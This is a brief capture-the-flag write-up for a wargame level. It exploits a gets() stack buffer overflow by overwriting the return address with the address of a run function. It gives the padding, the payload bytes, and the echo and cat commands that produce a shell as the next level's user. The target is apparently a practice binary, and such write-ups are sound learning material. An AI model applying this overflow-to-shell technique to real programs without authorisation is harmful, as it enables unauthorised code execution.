# level1

For this level, we use a stack buffer overflow attack on `gets()`
to modify the value on the stack of the function pointer the main will
return to.  
Padding: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS
addresse de run: 0x08048444 -> \x44\x84\x04\x08
We write the exploit to a file using
`echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\x44\x84\x04\x08"`  
and then run `cat /tmp/exploit /dev/stdin | ./level1`  
that gives us a shell as level2.